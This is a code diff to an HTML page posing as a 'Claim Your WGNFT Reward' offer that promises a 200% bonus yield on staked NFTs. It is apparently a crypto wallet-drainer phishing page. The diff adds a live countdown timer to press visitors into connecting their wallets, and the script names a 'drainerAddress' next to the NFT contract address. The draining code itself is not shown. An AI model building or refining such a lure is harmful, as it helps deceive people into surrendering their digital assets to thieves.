@@ -9,8 +9,11 @@
       font-family: sans-serif;
       background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
       color: #fff;
-      text-align: center;
-      padding: 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
       background-attachment: fixed;
       background-size: cover;
     }
@@ -20,7 +23,8 @@
       padding: 2rem;
       box-shadow: 0 0 18px #26a69a;
       max-width: 500px;
-      margin: 0 auto;
+      width: 100%;
+      text-align: center;
     }
     button {
       padding: 1rem 2rem;
@@ -41,12 +45,19 @@
       white-space: pre-wrap;
       text-align: left;
     }
+    #timer {
+      font-weight: bold;
+      color: #ffeb3b;
+    }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>🎁 Claim Your WGNFT Reward</h1>
-    <p>Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>Offer ends in <strong>3h 42m</strong>.</p>
+    <p>
+      Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>
+      Offer ends in <span id="timer">3h 42m 00s</span>.
+    </p>
     <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
     <button id="connectBtn">Connect Wallet</button>
     <button id="previewBtn">Preview Claim</button>
@@ -55,6 +66,18 @@
   </div>
 
   <script>
+    // Countdown timer
+    let countdown = 3 * 60 * 60 + 42 * 60; // 3h 42m in seconds
+    const timerElement = document.getElementById("timer");
+    setInterval(() => {
+      if (countdown <= 0) return;
+      countdown--;
+      const hrs = Math.floor(countdown / 3600);
+      const mins = Math.floor((countdown % 3600) / 60);
+      const secs = countdown % 60;
+      timerElement.innerText = `${hrs}h ${mins}m ${secs}s`;
+    }, 1000);
+
     const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
     const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";
 
